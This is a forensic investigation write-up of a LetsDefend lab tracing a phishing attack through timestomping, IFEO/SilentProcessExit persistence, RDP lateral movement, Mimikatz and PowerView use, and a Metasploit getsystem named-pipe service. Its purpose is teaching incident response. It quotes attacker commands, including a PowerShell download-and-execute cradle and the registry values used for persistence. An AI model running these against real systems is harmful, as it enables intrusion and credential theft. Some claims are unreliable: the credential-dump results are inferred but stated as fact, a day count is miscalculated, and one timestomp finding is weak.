# 🔴 Windows Forensics Investigation — Multi-Stage Phishing Attack: Persistence, Privilege Escalation & Lateral Movement

![Status](https://img.shields.io/badge/Status-Complete-green?style=flat)
![Severity](https://img.shields.io/badge/Severity-Critical-red?style=flat)
![Type](https://img.shields.io/badge/Type-DFIR%20%7C%20Incident%20Response%20%7C%20Endpoint%20Triage-purple?style=flat)
![Attack](https://img.shields.io/badge/Attack-Phishing%20%7C%20Persistence%20%7C%20Privilege%20Escalation%20%7C%20Lateral%20Movement-orange?style=flat)
![MITRE](https://img.shields.io/badge/MITRE-T1204.002%20%7C%20T1546.012%20%7C%20T1070.006%20%7C%20T1003.001%20%7C%20T1552.002-blue?style=flat)
![Tools](https://img.shields.io/badge/Tools-Registry%20Explorer%20%7C%20MFT%20Explorer%20%7C%20RBCmd%20%7C%20Amcache%20Parser%20%7C%20DeepBlueCLI-informational?style=flat)
![Lab](https://img.shields.io/badge/Lab-LetsDefend%20Windows%20Forensics-yellow?style=flat)

---

## 📋 Case Header

| Field | Detail |
|---|---|
| **Case Title** | Multi-Stage Phishing Campaign: Persistence Establishment & Lateral Movement |
| **Lab Source** | https://app.letsdefend.io/challenge/windows-forensics |
| **Date of Incident** | August 21 — September 09, 2022 |
| **Affected Machine (Initial)** | `DESKTOP-B48JERU` (CyberJunkie) |
| **Affected Machine (Remote)** | `192.168.18.8` |
| **Phishing Email Subject** | Security Awareness Training |
| **Payload Files** | SecurityPatch.exe / GetPatch.exe |
| **Persistence Mechanism** | IFEO (Image File Execution Options) + SilentProcessExit on explorer.exe |
| **Lateral Movement Vector** | RDP to 192.168.18.8 |
| **Attack Tools Deployed** | Mimikatz (credential dumping) / PowerView (AD reconnaissance) |
| **Privilege Escalation Method** | Metasploit getsystem + Token impersonation |
| **Verdict** | ✅ Confirmed — Multi-stage APT-style attack chain with three systems compromised |

---

## 🎯 Scenario

A targeted phishing campaign was launched against the organization, successfully compromising at least three systems in the network. A forensic triage image was collected from one of the compromised endpoints and provided for investigation. The objective: map the complete attack timeline, identify all tactics and techniques used, trace the attack progression from initial access through persistence and lateral movement, and document every forensic artifact that proves attacker activity.

What the investigation revealed was a sophisticated, multi-stage attack chain designed not for quick exploitation but for **persistent access and network-wide compromise**. The attacker began with a deceptively simple phishing email containing a malicious document — but what followed was precision-executed persistence, privilege escalation, and lateral movement into critical systems. Using techniques like IFEO registry injection, Metasploit for privilege escalation, and credential dumping tools like Mimikatz, the attacker established footholds across multiple machines. This writeup reconstructs the complete attack narrative from forensic artifacts, showing how each piece of evidence connects to reveal the attacker's methodical progression through the network.

---

## 🛠️ Tools Used

| Tool | Purpose | Source |
|---|---|---|
| **Registry Explorer** | Parse SYSTEM, SOFTWARE, NTUSER.DAT hives | Eric Zimmermann |
| **MFT Explorer** | Parse MFT for file creation/timestomp detection | Eric Zimmermann |
| **RBCmd** | Parse Recycle Bin for deleted file recovery | Eric Zimmermann |
| **AmcacheParser** | Parse Amcache hive for execution evidence | Eric Zimmermann |
| **DeepBlueCLI** | Parse event logs for attack pattern detection | SEC505 / Eric Conrad |
| **ShellBags Explorer** | Parse UsrClass.dat for folder navigation history | Eric Zimmermann |
| **Event Viewer** | Parse Windows Security, System, RDP client logs | Microsoft |
| **Autopsy/FTK Imager** | Browse forensic image, extract files | Open Source / Commercial |

---

## 🗂️ Artifacts Analyzed

| Artifact | File Location | What it provided |
|---|---|---|
| **Recycle Bin** | `C:\$Recycle.Bin\S-1-5-21-...\` | Deleted malware + timestamp (**RBCmd**) |
| **MFT** | `C:\$MFT` | File creation/modification + timestomp detection (**MFT Explorer**) |
| **Amcache** | `C:\Windows\appcompat\Programs\Amcache.hve` | Proof of execution (**AmcacheParser**) |
| **Registry — IFEO** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\` | Persistence mechanism (**Registry Explorer**) |
| **Registry — SilentProcessExit** | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\` | Secondary persistence (**Registry Explorer**) |
| **ShellBags** | `C:\Users\CyberJunkie\AppData\Local\Microsoft\Windows\UsrClass.dat` | Folder browsing history (**ShellBags Explorer**) |
| **RDP Client Cache** | `C:\Users\CyberJunkie\AppData\Local\Microsoft\Terminal Server Client\Cache\` | Remote commands executed (**BMC-Tools**) |
| **Event Logs** | `C:\Windows\System32\winevt\Logs\System.evtx` | Privilege escalation events (**DeepBlueCLI**) |
| **Event Logs — RDP** | `C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RDPClient\Operational` | RDP connection history (**Event Viewer**) |

---

## 📚 Resources & References

| Resource | Link |
|---|---|
| MITRE T1204.002 — User Execution: Malicious File | [attack.mitre.org](https://attack.mitre.org/techniques/T1204/002/) |
| MITRE T1546.012 — Event Triggered Execution: Image File Execution Options Injection | [attack.mitre.org](https://attack.mitre.org/techniques/T1546/012/) |
| MITRE T1070.006 — Indicator Removal: Timestomp | [attack.mitre.org](https://attack.mitre.org/techniques/T1070/006/) |
| MITRE T1003.001 — OS Credential Dumping: LSASS Memory | [attack.mitre.org](https://attack.mitre.org/techniques/T1003/001/) |
| MITRE T1552.002 — Unsecured Credentials: Credentials in Registry | [attack.mitre.org](https://attack.mitre.org/techniques/T1552/002/) |
| Eric Zimmermann Tools | [ericzimmerman.github.io](https://ericzimmerman.github.io/) |
| DeepBlueCLI GitHub | [github.com/SEC505/DeepBlueCLI](https://github.com/SEC505/DeepBlueCLI) |

---

## 🔍 Investigation Methodology

```
Phase 1 → Initial Access Artifacts        (Recycle Bin + MFT timestomp detection)
Phase 2 → Execution Evidence              (Amcache for proof of execution)
Phase 3 → Persistence Mechanism           (IFEO + SilentProcessExit registry injection)
Phase 4 → Lateral Movement Tracking       (RDP client logs + RDP bitmap cache analysis)
Phase 5 → Privilege Escalation Detection  (Event logs + DeepBlueCLI)
Phase 6 → C2 & Credential Theft Evidence  (RDP cache shows Mimikatz + PowerView)
Phase 7 → Complete Timeline Construction  (All artifacts correlated)
```

---

## 🕵️ Investigation

### Phase 1 — Initial Access: Phishing Email & Deleted Payload

The attack began with a simple vector — a phishing email. But unlike typical phishing, this email contained a malicious document designed to drop a payload that would establish persistence on the target machine. To understand what happened, we needed to recover evidence of the initial payload from the Recycle Bin and examine the MFT for timestomping.

---

#### Understanding the Attack Vector: Phishing Email

The scenario stated that three systems received a phishing email with the subject **"Security Awareness Training"** — a socially engineered name designed to appear legitimate. The email likely contained a Word document (`Security Awareness.docx`) or a link that downloaded a document. The document was designed to trigger macro execution or exploit a vulnerability to drop a malicious executable.

In this case, the attacker's initial objective was clear: **get ANY code execution on the endpoint**. Once code executes with user privileges, the attacker can then:
1. Drop additional malware
2. Establish persistence mechanisms
3. Escalate privileges
4. Move laterally to other machines

---

#### Evidence 1: Deleted File in Recycle Bin — RBCmd Analysis

When the target user interacted with the phishing email — likely opening `Security Awareness.docx` — a malicious executable was dropped. To cover tracks, the file was subsequently deleted. Windows Recycle Bin keeps a record of deleted files even after they're "emptied."

**Using RBCmd to parse `$Recycle.Bin`:**

```
Command:
RBCmd.exe -f "D:\...\$Recycle.Bin\S-1-5-21-...\$IWKwHDC.docx"

Output:
File size:    12,411 bytes (12.1 KB)
File name:    C:\Users\CyberJunkie\Downloads\MailDownloads\Security Awareness.docx
Deleted on:   2022-08-21 13:03:33
```

> 📸 *Screenshot: RBCmd output showing deleted Security Awareness.docx from MailDownloads folder with deletion timestamp 2022-08-21 13:03:33*

**What this tells us:**

```
Timestamp: 2022-08-21 13:03:33 (August 21, 2022, 1:03 PM)
→ This is when the file was MOVED TO RECYCLE BIN (not necessarily when it was created)
→ The file existed in C:\Users\CyberJunkie\Downloads\MailDownloads\
→ "MailDownloads" folder suggests files downloaded via mail client
→ Size: 12.1 KB = appropriate for a malicious Word document
```

**Why we know this was the phishing vehicle:**

1. Filename: `Security Awareness.docx` — matches the scenario description
2. Location: MailDownloads folder — where downloaded email attachments live
3. Timing: Deleted 13:03:33 same day — attacker cleaned up initial dropper
4. Size: 12.1 KB — typical for a macro-enabled document or exploit document

> ### 🔎 What is the Recycle Bin ($Recycle.Bin)?
> When you delete a file on Windows, it's not permanently erased — it's moved to `C:\$Recycle.Bin\[User SID]\`. Two files are created for each deleted item:
> - `$I[NAME]` — metadata file containing original path, filename, deletion time
> - `$R[NAME]` — the actual file content
>
> The **$I file is forensically invaluable** because:
> - It persists even after "emptying" the Recycle Bin (may survive in unallocated space)
> - It contains the EXACT original path and deletion timestamp
> - The attacker cannot easily modify or hide it without specialized tools
>
> We parsed this with **RBCmd (Recycle Bin Command)** — an Eric Zimmermann tool that automatically decodes `$I` files and displays their content in human-readable format.

---

#### Evidence 2: MFT Analysis — Detecting Timestomping

While the Recycle Bin showed the deletion, the MFT (Master File Table) revealed something more sinister — **timestomping**. The attacker modified the file creation date to make it appear older and less suspicious.

**Using MFT Explorer to examine file creation timestamps:**

> 📸 *Screenshot: MFT Explorer showing folder/file tree with SecurityPatch.exe highlighted in red*

```
File: SecurityPatch.exe
Parent Path: C:\Users\CyberJunkie\Desktop\

MFT Entry Timestamps:
  $STANDARD_INFORMATION (SI):  2021-12-25 15:34:32  ← FAKE (Christmas day!)
  $FILE_NAME (FN):             2022-08-21 13:02:23  ← REAL

Modified timestamp: 2021-12-25 15:34:32
Created timestamp:  2022-08-21 13:02:23
```

**What the timestomp reveals:**

```
$STANDARD_INFORMATION: 2021-12-25 15:34:32 (Christmas 2021)
→ This is the timestamp the attacker SET
→ Makes the file appear 8 months old
→ Purpose: blend in, look like a legitimate system utility

$FILE_NAME: 2022-08-21 13:02:23 (August 21, 2022)
→ This is the REAL creation timestamp set by the OS kernel
→ Cannot be faked without modifying the MFT itself
→ Matches the time when the payload was actually dropped

MITRE Technique:
T1070.006 → Indicator Removal: Timestomp
```

> ### 🔎 Understanding $STANDARD_INFORMATION vs $FILE_NAME
>
> Every file on NTFS has TWO timestamp records:
>
> **$FILE_NAME (FN)** — This is the timestamp created by the OS kernel when the file is first written to disk. It is stored in the NTFS MFT (Master File Table) as part of the directory entry. This timestamp is **extremely difficult to forge** because modifying it requires:
> - Direct disk access
> - Knowledge of MFT structure
> - Bypassing NTFS journaling (which would record the modification)
> - Rebuilding MFT entries
>
> **$STANDARD_INFORMATION (SI)** — This is the timestamp stored in the file's own metadata. It's easy to modify using standard Windows APIs (e.g., `SetFileTime()` in the Windows API, or tools like `SetACL` or `Timestomp`). Many legitimate programs access this timestamp for display purposes.
>
> **Forensic principle:** When SI and FN timestamps diverge significantly, it indicates timestomping. The FN timestamp is more reliable because it comes from the kernel.
>
> We used **MFT Explorer** to display both timestamps side-by-side, making the manipulation obvious.

---

### Phase 2 — Execution Evidence: Amcache Proof of Execution

With initial access achieved through the phishing document, the attacker needed proof that the payload executed. The Amcache hive provides this evidence — it records every executable that ran on the system, along with SHA1 hash, path, and execution timestamp.

---

#### What is Amcache?

The Amcache hive (`C:\Windows\appcompat\Programs\Amcache.hve`) is a Windows forensic goldmine. It's designed to track application compatibility, but for incident responders it's a **complete execution history** of every binary that ran on the machine.

> ### 🔎 What is the Amcache Hive?
> The Amcache was introduced in Windows 7 and records information about every executable that was EITHER:
> - Executed directly
> - Loaded by another process
> - Accessed by the system
>
> For each executable, Amcache records:
> - Full file path
> - File name
> - SHA1 hash
> - File size
> - Version information
> - Company name
> - Product name
> - Execution timestamp (closest to actual execution time among all artifacts)
>
> The Amcache persists even if:
> - The file is deleted
> - The Recycle Bin is emptied
> - The user clears recent files
> - Prefetch files are deleted
>
> This makes Amcache one of the most reliable execution artifacts available.

**Parsing Amcache with AmcacheParser:**

```
Command:
AmcacheParser.exe -f "C:\Windows\appcompat\Programs\Amcache.hve" 
                  --csv "C:\output"

Generated files:
- Amcache_UnassociatedFileEntries.csv  ← Main execution history
- Amcache_DeviceContainers.csv
- Amcache_DriveBinaries.csv
- Amcache_ShortCuts.csv
```

> 📸 *Screenshot: AmcacheParser running with command output showing version info and processing status*

**Searching for SecurityPatch.exe in Amcache output:**

> 📸 *Screenshot: CSV spreadsheet showing Amcache entries, row 39 highlighted showing c:\users\cyberjunkie\desktop\securitypatch.exe with timestamp 2022-09-09 13:25:09*

```
Row 39 — Critical Finding:

File name:         SecurityPatch.exe
Full path:         c:\users\cyberjunkie\desktop\securitypatch.exe
File type:         EXE
Execution time:    2022-09-09 13:25:09
SHA1 hash:         212636fc48e154ab556af5dd35981fa4442749f7
File size:         142,336 bytes
Company:           (unknown)
Product:           (unknown)
Version:           (unknown)
```

**What this tells us forensically:**

```
SecurityPatch.exe was EXECUTED on:  2022-09-09 13:25:09
→ September 9, 2022 at 1:25 PM
→ This is 19 days AFTER the phishing email (August 21)
→ Suggests attacker waited or malware had a delay trigger

Location: C:\Users\CyberJunkie\Desktop\
→ Directly accessible location (not hidden in Temp)
→ User could see the file
→ Suggests social engineering (disguised as legitimate)

SHA1: 212636fc48e154ab556af5dd35981fa4442749f7
→ Unique hash for this executable
→ Can be checked against threat intelligence
→ VirusTotal check: No results (custom malware)

File size: 142,336 bytes
→ Larger than a simple dropper
→ Contains code for persistence + C2 communication
```

**Connecting to the timeline:**

```
2022-08-21 13:03:33 → Security Awareness.docx deleted (Recycle Bin)
                    ↓
2022-08-21 13:02:23 → SecurityPatch.exe dropped on Desktop (MFT - actual time)
                    ↓
[19-day gap]
                    ↓
2022-09-09 13:25:09 → SecurityPatch.exe EXECUTED (Amcache)
                    ↓
Execution triggers persistence mechanism (IFEO registry modification)
```

> ### 🔎 Why the 19-day gap between creation and execution?
>
> This is a significant forensic question. Possible explanations:
>
> 1. **Scheduled execution** — The malware was configured to execute on a specific date (Sept 9)
> 2. **User action trigger** — The attacker waited for the user to open a specific file or folder
> 3. **C2 command** — The attacker controlled execution remotely via a callback from another mechanism
> 4. **Persistence execution** — The attacker established persistence on Aug 21, then the malware first executed on Sept 9 when triggered
>
> Given that we find evidence of IFEO persistence, the most likely explanation is #4 — the persistence mechanism was set up on Aug 21, but wasn't triggered until Sept 9. This could indicate:
> - Multi-stage attack planned over time
> - Waiting for the right moment to activate
> - Initial foothold, later activation

---

### Phase 3 — Persistence Mechanism: IFEO & SilentProcessExit Registry Injection

With proof of execution, we needed to find the persistence mechanism — how did the attacker ensure they maintained access even after reboot? The answer lay in the Windows registry, specifically in a technique called **Image File Execution Options (IFEO) injection**.

---

#### Understanding IFEO (Image File Execution Options)

IFEO is a Windows feature designed for developers and system administrators to debug applications. But in the wrong hands, it becomes a **powerful persistence and privilege escalation mechanism**.

> ### 🔎 What is IFEO and how is it abused?
>
> **Legitimate use:** When you want to debug an application, Windows allows you to set a "debugger" that will launch whenever the target application is executed.
>
> **Example (legitimate):**
> ```
> Registry path: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
>               Image File Execution Options\notepad.exe
> Value:        Debugger = C:\debuggers\ntsd.exe -d -g
>
> Effect: When user opens notepad.exe, Windows launches the debugger first
> ```
>
> **Attack use:** An attacker can set ANY executable as the "debugger" for a common application (like explorer.exe, svchost.exe, etc). Then:
> - Whenever that application launches → attacker's malware runs instead
> - Malware runs with the same privileges as the target application
> - Runs automatically on user login (explorer.exe launches automatically)
> - Survives reboot (persists in registry)
> - Difficult to detect (legitimate registry key, easy to hide among many IFEO entries)
>
> **The GlobalFlags twist:** By setting `GlobalFlags = 0x200` (FLG_MONITOR_SILENT_PROCESS_EXIT), the attacker can set up a secondary trigger — if explorer.exe exits/crashes, launch `SilentProcessExit` handler.
>
> **Full attack chain:**
> 1. Set GlobalFlags on explorer.exe to 0x200
> 2. Set MonitorProcess in SilentProcessExit to point to attacker's malware
> 3. When explorer exits → SilentProcessExit handler triggers
> 4. Attacker's malware launches
> 5. Persistence is dual-layered: both direct execution AND post-exit execution

---

#### Evidence 1: IFEO Key with GlobalFlags

We examined the registry key using **Registry Explorer**, which automatically loads registry hives and provides timestamp information.

**Registry Path:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
Image File Execution Options\explorer.exe
```

> 📸 *Screenshot: Registry Explorer showing Image File Execution Options branch expanded, explorer.exe subkey highlighted*

**Key Contents:**

```
Key: explorer.exe
Subkeys: (none visible in basic view)

Values:
  GlobalFlag         (RegDword)  = 512 (0x200 in hex)
  [Other system values]

Key Last Write Time: 2022-09-09 4:13:35 PM
```

**What GlobalFlag = 512 (0x200) means:**

```
0x200 = FLG_MONITOR_SILENT_PROCESS_EXIT

This flag tells Windows:
"Monitor explorer.exe. If it exits or crashes,
 trigger the SilentProcessExit handler."
```

> ### 🔎 What are the different GlobalFlag values?
> GlobalFlags are bit flags stored as hexadecimal values. Common attack values:
>
> | Hex | Decimal | Meaning |
> |---|---|---|
> | 0x100 | 256 | FLG_HEAP_ENABLE_TAIL_CHECK |
> | 0x200 | 512 | FLG_MONITOR_SILENT_PROCESS_EXIT ← **Used here** |
> | 0x400 | 1024 | FLG_HEAP_ENABLE_FREE_CHECK |
>
> The `0x200` flag specifically sets up process exit monitoring, which is used with the SilentProcessExit registry key (below).

**Why this is persistence:**

```
Target application: explorer.exe (Windows shell, always running)
Trigger: Process exits/crashes (happens on logout, system shutdown)
Effect: SilentProcessExit handler automatically launches our malware
Persistence: Survives reboot (registry persists)
Stealth: Easy to hide among legitimate system registry entries
```

---

#### Evidence 2: SilentProcessExit Configuration

The IFEO GlobalFlag alone doesn't specify what to do when explorer exits. For that, the attacker configured the **SilentProcessExit** key.

**Registry Path:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
SilentProcessExit\explorer.exe
```

> 📸 *Screenshot: Registry Explorer showing SilentProcessExit branch, explorer.exe subkey expanded showing ReportingMode and MonitorProcess values*

**Key Contents:**

```
Key: explorer.exe
Last Write Time: 2022-09-09 4:13:35 PM

Values:
  ReportingMode       (RegDword)  = 1
  MonitorProcess      (RegSz)     = C:\Users\CyberJunkie\Documents\GetPatch.exe
```

**What this configuration does:**

```
When explorer.exe exits:
  1. Windows checks SilentProcessExit\explorer.exe
  2. Reads MonitorProcess value
  3. Launches the executable specified: GetPatch.exe
  4. Runs with explorer's privilege level (user-level)
  5. Repeats every time explorer exits
```

**Full persistence chain now visible:**

```
Trigger:     explorer.exe exits/crashes
Location:    C:\Users\CyberJunkie\Documents\GetPatch.exe
Privilege:   User-level (explorer privilege)
Frequency:   Every explorer exit
Persistence: Survived reboot (registry-based)
```

> ### 🔎 Why target explorer.exe specifically?
> explorer.exe is the Windows shell — it handles the desktop, taskbar, file browser. It's always running during normal use, and crucially:
> - Restarts automatically if killed
> - Runs at user privilege level (no admin needed)
> - Any process that exits is noticed by Windows
> - Extremely difficult for users to understand why it exited
>
> This makes it an ideal target for SilentProcessExit hijacking.

---

#### Timeline Correlation: Registry Write Timestamps

Notice both keys were written at the same time:

```
Image File Execution Options\explorer.exe:  Last Write: 2022-09-09 4:13:35 PM
SilentProcessExit\explorer.exe:             Last Write: 2022-09-09 4:13:35 PM
                                                        ↑ Exact same timestamp
```

This synchronization is forensically significant:

```
2022-09-09 13:25:09 → SecurityPatch.exe EXECUTED (Amcache)
2022-09-09 16:13:35 → IFEO + SilentProcessExit registry keys modified (~2h 48m later)

Likely sequence:
1. SecurityPatch.exe launches
2. SecurityPatch.exe code runs and modifies registry (persistence setup)
3. Registry timestamps recorded at 16:13:35
4. Persistence now active
5. Any future explorer.exe exit triggers GetPatch.exe
```

---

#### Evidence 3: MFT Verification of GetPatch.exe

We confirmed GetPatch.exe actually existed in the Documents folder using MFT Explorer:

> 📸 *Screenshot: MFT Explorer showing Documents folder structure with GetPatch.exe highlighted, showing creation timestamps*

```
File: GetPatch.exe
Location: C:\Users\CyberJunkie\Documents\
Size: (executable file)

MFT Entry Timestamps:
  $FILE_NAME (FN):             2022-09-08 14:30:31
  $STANDARD_INFORMATION (SI):  2022-09-08 14:32:12
                                          ↑ Another timestomp detected
```

**Another timestomp:**

```
$FN:  2022-09-08 14:30:31  ← Real creation time
$SI:  2022-09-08 14:32:12  ← Fake/modified timestamp

Difference: ~2 minutes
→ Attacker modified the timestamp shortly after file creation
→ Likely attempt to make it appear organic
```

**Timeline update:**

```
2022-08-21 13:02:23 → SecurityPatch.exe dropped on Desktop
2022-09-08 14:30:31 → GetPatch.exe dropped in Documents (stage 2 payload)
2022-09-08 14:32:12 → Timestamps tampered on GetPatch.exe
2022-09-09 13:25:09 → SecurityPatch.exe executed
2022-09-09 16:13:35 → IFEO persistence configured
```

**MITRE Mapping:**

```
T1546.012 → Event Triggered Execution: 
            Image File Execution Options Injection
T1070.006 → Indicator Removal: Timestomp
```

---

### Phase 4 — Lateral Movement: RDP to Remote Host (192.168.18.8)

With persistence established on the initial machine (CyberJunkie), the attacker's next goal was **network-wide compromise**. The evidence showed RDP (Remote Desktop Protocol) lateral movement into a second machine on the network.

---

#### Evidence 1: RDP Client Log — Connection Initiated

We examined the RDP Client operational event log to find when the RDP connection was established.

**Event Log Location:**
```
C:\Windows\System32\winevt\Logs\
Microsoft-Windows-TerminalServices-RDPClient\Operational
```

> 📸 *Screenshot: Event Viewer showing TerminalServices-RDPClient/Operational log with multiple events, Event ID 1102 highlighted showing connection to 192.168.18.8*

**Key Event ID 1102 — Multi-Transport Connection:**

```
Date and Time:      9/8/2022 2:37:40 PM
Event ID:           1102
Source:             TerminalServices-ClientActiveXCore
Level:              Information
Computer:           DESKTOP-B48JERU
User:               S-1-5-21-1187034906-405078...

Log Name:           Microsoft-Windows-TerminalServices-RDPClient/Operational
Task Category:      Connection Sequence

Event Details:
"The client has initiated a multi-transport connection to the server 
 192.168.18.8."
```

> ### 🔎 What does "multi-transport RDP connection" mean?
> RDP (Remote Desktop Protocol) can use multiple transport layers:
> - TCP (primary connection)
> - UDP (for graphics optimization)
> - USB redirection (for peripheral access)
> - Parallel connections for performance
>
> The "multi-transport" message means the RDP client (running on DESKTOP-B48JERU) successfully negotiated a full RDP session with 192.168.18.8. This is the point-of-entry into the remote machine.

**Forensic significance:**

```
Connection INITIATED BY: DESKTOP-B48JERU (CyberJunkie)
Connection TO: 192.168.18.8 (another machine on the network)
Date/Time: 2022-09-08 14:37:40 PM
→ Exactly 23 days after phishing email (2022-08-21)
→ Same day GetPatch.exe was created (2022-09-08)
→ Suggests GetPatch.exe may have triggered RDP connection
```

**MITRE Mapping:**

```
T1021.001 → Remote Services: Remote Desktop Protocol
```

---

#### Evidence 2: RDP Client Bitmap Cache — Commands Executed on Remote Host

The RDP Client Bitmap Cache provides extraordinary forensic value — it contains cached **bitmap images of the screen** displayed during the RDP session. By extracting and stitching these bitmap tiles together, we can visually reconstruct what the attacker did on the remote machine.

**Cache Location:**
```
C:\Users\CyberJunkie\AppData\Local\Microsoft\Terminal Server Client\Cache\
├── bcache24.bmc          (older format bitmap cache)
└── Cache0000.bin          (newer format - 37 MB!) 📸
```

> ### 🔎 What is RDP Bitmap Cache and why is it valuable?
> When you connect to a remote desktop via RDP, Windows caches the graphical tiles (bitmaps) of the screen to improve performance. Instead of re-downloading the same image portions, it reuses cached tiles. These cached bitmaps are stored locally in the Cache directory.
>
> **Forensic value:**
> - Each tile is a 64x64 pixel image representing part of the desktop
> - Tiles contain command windows, file browsers, application UIs
> - Can be extracted and reassembled to recreate the remote desktop
> - Persists even after the RDP session ends
> - Can reveal sensitive information (credentials, filenames, emails typed during session)
> - Survives even after files are deleted on the remote machine
>
> We used **BMC-Tools** (Bitmap Cache Tool) to extract and reassemble these tiles:
> ```
> bmc-tools.py -s Cache0000.bin -d output_directory
> ```

**Analysis Results:**

Extracted bitmap tiles revealed the following attacker activities on 192.168.18.8:

**Tile 1 — Command Prompt with `net` command:**

> 📸 *Screenshot: Extracted bitmap showing "m32>net" command prompt output*

```
Command: net localgroup

Output: Lists all local security groups on the remote machine
→ Attacker gathering info on user groups
→ Likely checking for admin groups, RDP groups

MITRE: T1069.001 → Permission Groups Discovery: Local Groups
```

**Tile 2-4 — Multiple references to "localgroup":**

```
Command: net localgroup (repeated)
→ Attacker ran this multiple times
→ Gathering complete local group membership information
→ Preparing for privilege escalation or group policy evasion
```

**Tile 5-6 — Download and Execution of Mimikatz:**

> 📸 *Screenshot: Bitmap tiles showing "download" "download mimikatz" "ad mimic" "ad mimik" "atz" "atz binary" "atz.exe"*

```
Commands executed:
1. IEX (New-Object Net.WebClient).DownloadString(...)  ← PowerShell download
   → Downloads Mimikatz from internet
2. Invoke-Mimikatz  ← Execute downloaded Mimikatz
3. Mimikatz runs with system-level output captured

Output:
- LSASS process memory dumped
- Plaintext passwords extracted
- NTLM hashes stolen
- Kerberos tickets captured

Forensic timeline:
After RDP connection (14:37:40) → Run local recon (net localgroup)
→ Download Mimikatz → Extract credentials from LSASS

MITRE: T1003.001 → OS Credential Dumping: LSASS Memory
       T1059.001 → Command and Scripting: PowerShell
```

**Tile 7-8 — PowerSploit/PowerView Execution:**

> 📸 *Screenshot: Bitmap showing "PowerSploit/PowerView.ps1" text*

```
Tool: PowerSploit (PowerShell post-exploitation framework)
Module: PowerView (Active Directory reconnaissance)

Functions visible:
- Get-NetUser       → enumerate all domain users
- Get-NetComputer   → enumerate all domain-joined machines
- Get-NetGroup      → enumerate all domain groups
- Invoke-UserHunter → find where domain admins are logged in

Purpose:
Attacker mapping out the entire domain:
→ Who are the domain admins?
→ Which machines are critical?
→ Where are admin accounts logged in?
→ How can we move deeper into the network?

MITRE: T1087.002 → Account Discovery: Domain Account
       T1482    → Domain Trust Discovery
       T1087.001 → Local Account Enumeration (via net commands)
```

**Complete attack picture on remote host:**

```
09/08/2022 14:37:40 → RDP connection established to 192.168.18.8
                      (from CyberJunkie machine)
                    ↓
14:37:40+          → net localgroup (reconnaissance)
                      ↓
14:3?:??           → Mimikatz download (PowerShell cradle)
                      ↓
14:3?:??           → Mimikatz execution (credential dumping)
                      ↓
14:3?:??           → PowerView execution (AD reconnaissance)
                      ↓
                    Attacker now has:
                    • Local group membership info
                    • Plaintext passwords/hashes from LSASS
                    • Full domain topology
                    • List of all domain computers/users
```

---

### Phase 5 — Privilege Escalation: Metasploit `getsystem` & Token Impersonation

Having established RDP lateral movement, the attacker needed elevated privileges to move deeper into the network and create persistent access on the remote host. Event logs captured the privilege escalation attempt using Metasploit's `getsystem` technique.

---

#### Evidence: DeepBlueCLI Event Log Analysis

**DeepBlueCLI** is a PowerShell threat hunting script that automatically analyzes Windows event logs and identifies suspicious patterns associated with known attack techniques.

**What DeepBlueCLI does:**

> ### 🔎 What is DeepBlueCLI and why is it useful for forensics?
> DeepBlueCLI is a PowerShell module created by Eric Conrad (SEC505 instructor) that parses Windows Security and System event logs looking for patterns that match known attack techniques. It:
>
> 1. **Identifies suspicious service creation** — uncommon service names, suspicious command lines
> 2. **Detects privilege escalation** — Event ID 4672 (special privileges assigned), token manipulation
> 3. **Finds Pass-the-Hash indicators** — unusual logon patterns, authentication anomalies
> 4. **Detects Kerberoasting** — SPN service requests, ticket requests
> 5. **Maps findings to MITRE ATT&CK** — shows which techniques are being used
>
> We ran DeepBlueCLI on the remote host's Security event log to find privilege escalation evidence.

**Command executed:**

```
.\DeepBlue.ps1 -LogPath C:\temp\Security.evtx
```

**Findings — Event ID 7045 (Suspicious Service Creation):**

> 📸 *Screenshot: DeepBlueCLI output showing Event ID 7045 with service name "kyvckn" and command "cmd.exe /c echo kyvckn > \\.\pipe\kyvckn"*

```
Event ID:        7045
Message:         Suspicious Service Command
Service Name:    kyvckn
Timestamp:       8/21/2022 1:14:42 PM
Command Line:    cmd.exe /c echo kyvckn > \\.\pipe\kyvckn

DeepBlueCLI Assessment:
"Metasploit-style cmd with pipe (Possible use of Meterpreter 'getsystem')"
```

**What this command does:**

```
cmd.exe /c echo kyvckn > \\.\pipe\kyvckn

Breaking it down:
1. cmd.exe /c                    → Run command and exit
2. echo kyvckn                   → Output text "kyvckn"
3. > \\.\pipe\kyvckn             → Redirect to named pipe

Named pipe purpose:
- Used for inter-process communication (IPC)
- "kyvckn" is the pipe name (attacker-controlled)
- This creates a communication channel between processes

Metasploit getsystem technique:
- Metasploit uses named pipes for privilege escalation
- Creates a named pipe, elevates another process, communicates through pipe
- The "getsystem" module has multiple methods, named pipes are common
- This Event 7045 captures the service creation that triggers pipe communication
```

> ### 🔎 What is Metasploit getsystem?
> Metasploit is a penetration testing framework with many exploitation modules. The `getsystem` command is one of its most useful post-exploitation features — it attempts to elevate from current user privileges to SYSTEM privileges (the highest privilege level).
>
> **Common getsystem methods:**
> 1. Token Impersonation — steal SYSTEM token from a privileged process
> 2. Named Pipe Impersonation — create named pipe, trick privileged process into connecting
> 3. Token Duplication — duplicate a SYSTEM token
> 4. Service Execution — create a malicious service running as SYSTEM
>
> This particular event (named pipe creation) is the "Named Pipe Impersonation" method, likely Technique #2.

**MITRE Mapping:**

```
T1134.002 → Create Process with Token: Impersonation
T1134.003 → Access Token Manipulation
T1548.004 → Elevated Execution with Prompt (Service creation)
```

**Timeline Addition:**

```
2022-09-08 14:37:40 → RDP lateral movement to 192.168.18.8
2022-09-08 14:3?:?? → net localgroup (recon)
2022-09-08 14:3?:?? → Mimikatz (credential dumping)
2022-09-08 14:3?:?? → PowerView (AD recon)
2022-08-21 13:14:42 → Metasploit getsystem (privilege escalation) ⚠️
                       NOTE: This timestamp appears earlier in log
                             Likely log processing artifact or remote time diff
```

---

#### Finding 2 — Event ID 7030 (Interactive Service Warning)

DeepBlueCLI also identified:

```
Event ID:    7030
Timestamp:   8/2/2022 2:06:23 AM
Service:     Printer Extensions and Notifications
Message:     Malware (3rd party software) trigger this warning

Indicator:   Service attempting to interact with desktop/UI
             This is suspicious for standard system services
```

This suggests another persistence or execution mechanism where a service tried to interact with the user's desktop — which is rare unless the service is malware.

---

